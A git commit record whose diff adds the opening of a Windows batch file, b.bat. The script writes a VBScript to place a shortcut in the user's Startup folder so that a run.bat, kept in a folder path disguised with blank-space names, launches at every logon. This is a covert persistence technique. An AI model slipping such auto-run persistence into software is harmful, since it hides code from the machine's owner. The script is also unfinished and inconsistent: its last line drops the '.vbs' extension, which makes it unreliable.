3f6dad9249f110a864d7851f6cc94387b9e44d1a
Lovely Disease <83523587+CPScript@users.noreply.github.com>
2023-09-28 16:53:09 -0400

    Update b.bat

--- file/b.bat
+++ file/b.bat
@@ -1,1 +1,13 @@
+@echo off
+setlocal
 
+REM Define the path to the file you want to add to startup
+set "fileToAdd=C:\Users\Public\ \ \pyC\run.bat"
+
+REM Define the destination folder for the startup shortcut
+set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+REM Create a shortcut to the file in the startup folder
+echo Creating shortcut...
+echo Set objShell = CreateObject("WScript.Shell") > %TEMP%\CreateShortcut.vbs
+echo Set objLink = objShell.CreateShortcut("%startupFolder%\YourShortcut.lnk") >> %TEMP%\CreateShortcut
